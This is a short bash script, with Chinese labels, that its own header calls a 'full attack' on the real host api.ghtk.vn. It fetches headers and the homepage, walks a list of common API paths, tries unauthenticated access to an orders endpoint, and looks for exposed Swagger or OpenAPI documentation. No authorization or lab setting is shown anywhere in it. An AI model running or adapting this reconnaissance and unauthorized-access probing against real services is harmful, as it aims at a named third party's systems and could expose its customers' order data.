#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 新发现：api.ghtk.vn完整攻击"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TARGET="api.ghtk.vn"

echo "[*] 基本信息"
curl -sI "https://$TARGET" | head -15

echo ""
echo "[*] 首页内容"
curl -sk "https://$TARGET" | head -50

echo ""
echo "[*] 测试常见API路径"
APIS=(
    "/api"
    "/v1"
    "/v2"
    "/v1/user"
    "/v1/order"
    "/v1/tracking"
    "/health"
    "/ping"
    "/status"
)

for api in "${APIS[@]}"; do
    echo -n "  $api → "
    status=$(curl -sk "https://$TARGET$api" -w "%{http_code}" -o /tmp/api_resp -m 3 2>/dev/null)
    echo "$status"
    if [ "$status" == "200" ]; then
        cat /tmp/api_resp | head -20
    fi
done

echo ""
echo "[*] 测试未授权API访问"
curl -sk "https://$TARGET/api/v1/orders" | jq . 2>/dev/null | head -30

echo ""
echo "[*] 测试API文档"
for path in "/swagger.json" "/api-docs" "/docs" "/openapi.json"; do
    echo -n "  $path → "
    curl -sk "https://$TARGET$path" -w "%{http_code}" -o /tmp/doc -m 3 2>/dev/null
    [ -s /tmp/doc ] && echo "$(wc -c < /tmp/doc) bytes" && cat /tmp/doc | jq . 2>/dev/null | head -30
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
